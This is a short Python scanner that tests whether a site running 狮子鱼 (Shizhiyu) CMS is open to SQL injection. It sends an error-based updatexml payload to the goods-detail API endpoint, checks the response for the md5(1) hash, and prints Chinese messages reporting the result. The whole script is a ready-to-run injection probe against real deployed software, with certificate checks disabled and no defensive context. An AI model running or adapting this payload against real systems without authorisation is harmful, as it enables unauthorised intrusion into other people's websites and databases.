#!/usr/bin/env python
# coding=utf-8
import requests, threading
from termcolor import colored

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''
def pscan_vuln(url):
    urls = url
    global results
    try:
        response = requests.get(url=url +'/index.php?s=apigoods/get_goods_detail&id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1)', verify=False,timeout=20)
        if 'c4ca4238a0b923820dcc509a6f75849' in response.text:
            print(colored('[+]存在狮子鱼CMSsql注入', 'red'))
            results = f'{urls}-->存在狮子鱼CMSsql注入'
        else:
            print('[-]不存在狮子鱼CMSsql注入')
    except:
        print('[-]不存在狮子鱼CMSsql注入')


def szysql(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results
